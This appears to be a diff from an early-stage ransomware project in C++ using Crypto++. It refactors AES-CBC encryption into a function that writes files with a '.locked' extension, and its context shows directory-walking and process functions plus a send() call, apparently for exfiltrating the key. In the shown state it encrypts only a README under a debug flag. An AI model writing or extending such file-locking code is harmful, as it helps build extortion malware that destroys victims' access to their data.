@@ -24,12 +24,15 @@ using namespace boost::filesystem;
 using namespace CryptoPP;
 
 #define EMPTY ""
+#define LOCKED_EXTENSION ".locked"
+#define DEBUG
 
 struct crypt_data {
 	byte key[AES::DEFAULT_KEYLENGTH];
 	byte iv[AES::BLOCKSIZE];
 };
 
+void encrypt(const crypt_data* data, string path);
 crypt_data* generatekey();
 void iterate(const path& parent);
 void process(const path& path);
@@ -44,8 +47,16 @@ int main(int argc, char* argv[]) {
 
 	crypt_data* d = generatekey();
 
+#ifdef DEBUG
+	encrypt(d, "./README.md");
+#endif
+
 	send();
 
+	return 0;
+}
+
+void encrypt(const crypt_data* d, string path) {
 	string cipher;
 
 	// Print key and initialization vector
@@ -60,13 +71,13 @@ int main(int argc, char* argv[]) {
 	siv.clear();
 
 	string plain;
-	FileSource("./plaintext", true, new StringSink(plain));
+	FileSource(path.c_str(), true, new StringSink(plain));
 	cout << "Plaintext:\t" << plain << endl;
 
 	CBC_Mode<AES>::Encryption e;
 	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);
 
-	StringSource s(plain, true, new StreamTransformationFilter(e, new FileSink("./ciphertext")));
+	StringSource s(plain, true, new StreamTransformationFilter(e, new FileSink((path + LOCKED_EXTENSION).c_str())));
 
 	StreamTransformationFilter filter(e);
 	filter.Put((const byte*) plain.data(), plain.size());
@@ -80,7 +91,6 @@ int main(int argc, char* argv[]) {
 	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
 	cout << "Ciphertext:\t" << ciphertext << endl;
 
-	return 0;
 }
 
 crypt_data* generatekey() {
